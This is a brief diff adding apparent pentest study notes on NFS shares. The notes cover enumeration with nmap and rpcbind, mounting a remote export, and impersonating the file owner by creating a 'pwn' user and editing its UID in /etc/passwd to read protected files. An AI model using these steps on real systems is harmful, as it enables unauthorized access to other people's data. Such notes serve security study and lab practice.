@@ -1,0 +1,22 @@
+Common nfs shares readable and writable by all
+
+Port 2049
+
+Scanning for NFS shares
+rpcbind shows the ports of the rpc services listening on
+rpcbind TCP port 111
+
+ls -l /usr/share/nmap/scripts/nfs*
+
+nmap -p 111 --scripts nfs* {IP}
+
+sudo mount -o nolock {IP}:{path} {mypath}
+
+Access path where the user and group is a uuid
+
+sudo adduser pwn
+sudo sed -i -e 's/{uuid of our user}/{uuid we need}/g' /etc/passwd
+
+su pwn
+id
+cat {path}
